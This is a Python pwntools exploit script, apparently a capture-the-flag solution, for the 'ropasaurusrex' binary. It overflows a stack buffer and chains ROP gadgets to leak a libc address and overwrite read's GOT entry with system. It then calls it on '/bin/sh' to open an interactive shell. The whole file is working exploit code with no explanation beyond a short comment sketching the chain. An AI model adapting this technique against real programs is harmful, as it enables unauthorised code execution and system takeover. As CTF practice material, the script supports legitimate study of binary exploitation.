from pwn import *

context.log_level = 'debug'

binary = ELF('./ropasaurusrex')
lib = ELF('/lib/i386-linux-gnu/libc.so.6')

system = lib.symbols['system']
read = lib.symbols['read']

writePlt = binary.plt['write']
writeGot = binary.got['write']
readPlt = binary.plt['read']
readGot = binary.got['read']

sub1 = 0x80483F4
main = 0x804841d
binsh = '/bin/sh'
writable = 0x08049530


pppr = 0x080484b6

'''
rop code

write(1, readGot, 4)
read(0, wirtable, 4) < '/bin/sh'
read(0, readGot, 4) < system offset
write(1, readGot, 4)
read('/bin/sh')
'''

p = process(['./ropasaurusrex'])

payload = 'a' * 0x88 + 'b' * 0x4 
payload += p32(writePlt) + p32(pppr) + p32(1) + p32(readGot) + p32(4) 
payload += p32(readPlt) + p32(pppr) + p32(0) + p32(writable) + p32(8) 
payload += p32(readPlt) + p32(pppr) + p32(0) + p32(readGot) + p32(4) 
payload += p32(writePlt) +p32(pppr) + p32(1) + p32(readGot) + p32(4)
payload += p32(readPlt) + p32(1) + p32(writable)

#gdb.attach(proc.pidof(p)[0], 'b *read')
p.sendline(payload)
leak = u32(p.recv(4))
leak = leak - read
print hex(leak)
p.sendline(binsh)
p.sendline(p32(leak + system))
p.recv(4)
p.interactive()
